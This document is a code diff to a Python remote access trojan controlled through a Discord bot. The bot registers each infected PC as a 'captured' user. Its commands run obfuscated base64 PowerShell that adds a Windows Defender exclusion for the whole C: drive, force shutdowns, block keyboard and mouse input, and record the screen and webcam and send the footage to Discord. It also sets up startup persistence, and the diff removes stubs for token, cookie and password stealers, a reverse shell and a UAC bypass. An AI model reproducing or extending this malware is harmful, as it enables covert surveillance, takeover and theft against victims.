@@ -21,16 +21,26 @@ NON_STANDARD_PACKAGES = [
     "pillow",
     "pycryptodome",
     "comtypes",
-    "requests"
+    "requests",
+    "pyscreeze",
+    "mss"  # Add this as a backup
 ]
-
 def install_packages():
     """Install non-standard Python packages with hidden console on Windows."""
     creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
 
+    # Special mapping for packages that have different import names
+    package_mapping = {
+        "opencv-python": "cv2",
+        "pycryptodome": "Cryptodome",
+        "pillow": "PIL",
+        "pyscreeze": "pyscreeze"  # Add this line (though it should be the same)
+    }
+
     for package in NON_STANDARD_PACKAGES:
         try:
-            module_name = "cv2" if package == "opencv-python" else package.split(".")[0]
+            # Use mapping if exists, otherwise use the package name
+            module_name = package_mapping.get(package, package.split(".")[0])
             __import__(module_name)
         except ImportError:
             print(f"Installing {package}...")
@@ -46,10 +56,8 @@ def install_packages():
                 print(f"Successfully installed {package}")
             except subprocess.CalledProcessError as e:
                 print(f"Failed to install {package}: {e.stderr}")
-
 # Run package installation at startup
 install_packages()
-
 # Import non-standard modules after installation
 import discord
 from discord.ext import commands, tasks
@@ -66,9 +74,11 @@ from pygame.locals import *
 intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
-
+intents.message_content = True  # Add this line
 bot = commands.Bot(command_prefix="!", intents=intents)
 category_id="replaceme --> in builder category id"
+user_channels = {}
+
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user.name}")
@@ -86,25 +96,42 @@ async def on_ready():
     if channel:
         await channel.send(f"PC turned on, user {pc_username} back online!")
     else:
-        channel = await category.create_text_channel(pc_username)
+        channel = await category.create_text_channel(pc_username.lower())  # Use lowercase for consistency
         await channel.send(f"New user captured: {pc_username}!")
+    
+    # Store the channel for this user
+    user_channels[pc_username.lower()] = channel.id
+
+# Add this function to check if command is from the correct user's channel
+def is_correct_user_channel():
+    async def predicate(ctx):
+        pc_username = os.getlogin().lower()
+        if pc_username in user_channels:
+            return ctx.channel.id == user_channels[pc_username]
+        return False
+    return commands.check(predicate)
+
 
 @bot.command()
+@is_correct_user_channel()
 async def exclusion(ctx):
     await ctx.send("3xc1usion has ben sent to the reg") 
     subprocess.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==")
 
 @bot.command()
+@is_correct_user_channel()
 async def remove_exclusion(ctx):
     await ctx.send("3xc1usion has been removed from the reg")
     subprocess.run("powershell -enc UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAIgBDADoAXAAiAA0ACgA=")
 
 @bot.command()
+@is_correct_user_channel()
 async def restart(ctx, seconds, message):
     await ctx.send(f"System will poweroff in {seconds}.")
     subprocess.run(f'shutdown /s /t {seconds} /c "{message}"', shell=True)
 
 @bot.command()
+@is_correct_user_channel()
 async def screenshot_screen(ctx, seconds: int):
     await ctx.send(f"Starting screenshot capture for {seconds} seconds...")
     for i in range(seconds):
@@ -124,6 +151,7 @@ async def screenshot_screen(ctx, seconds: int):
 
 
 @bot.command()
+@is_correct_user_channel()
 async def dis_input(ctx, duration: int):
     """
     Blocks keyboard and mouse input for `duration` seconds.
@@ -145,6 +173,7 @@ async def dis_input(ctx, duration: int):
 
 
 @bot.command()
+@is_correct_user_channel()
 async def open_browser(ctx, browser: str, url: str, tabs: int = 1):
     """
     Opens the specified URL in one or more tabs of a chosen browser.
@@ -288,6 +317,7 @@ async def send_video_file(ctx, video_filename):
         return False
 
 @bot.command()
+@is_correct_user_channel()
 async def record_cam(ctx, seconds: int):
     """
     Records webcam video for the specified duration and sends it to Discord.
@@ -342,6 +372,7 @@ async def record_cam(ctx, seconds: int):
             os.remove(video_filename)
 
 @bot.command()
+@is_correct_user_channel()
 async def record_screen(ctx, duration: int = 10):
     """
     Records the screen for the specified duration and sends it to Discord.
@@ -377,6 +408,7 @@ async def record_screen(ctx, duration: int = 10):
             os.remove(video_filename)
 
 @bot.command()
+@is_correct_user_channel()
 async def record_split(ctx, duration: int = 10):
     """
     Records both webcam and screen side-by-side for the specified duration and sends to Discord.
@@ -433,6 +465,7 @@ async def record_split(ctx, duration: int = 10):
             os.remove(video_filename)
 
 @bot.command()
+@is_correct_user_channel()
 async def clean_chat(ctx):
     """
     Deletes all messages in the current channel, including attachments and videos.
@@ -499,6 +532,7 @@ async def check_startup():
         print(f"Error in check_startup task: {e}")
 
 @bot.command()
+@is_correct_user_channel()
 async def startup(ctx):
     """
     Copies the current Python script or executable to C:\BotStartup and Windows startup.
@@ -576,33 +610,7 @@ async def startup(ctx):
     except Exception as e:
         await ctx.send(f"❌ An unexpected error occurred: {e}")
  
-@bot.command()
-async def tkn_grab(ctx):#done
-    filename="discord_token_grabber.py"
-
-@bot.command()
-async def bsod(ctx):#done
-    filename="bsod.py"
-
-@bot.command()
-async def get_cookies(ctx):#done
-    filename="get_cookies.py"
-
-@bot.command()
-async def pass_light(ctx):#done
-    filename="passwords_grabber.py"
-
-@bot.command()
-async def pass_heavy(ctx,bot_k,cat_id):#done
-    filename="gruppe.py"
-
-@bot.command()
-async def reverse_shell(ctx):#done
-    filename="reverse_shell"
-
-@bot.comnand()
-async def uac(ctx):
-    filename="uac_bypass.py"
+# Commands are added by the builder above this line
 
 # Run the bot --> in the builder replace this
 bot.run('bot token here-->replace')
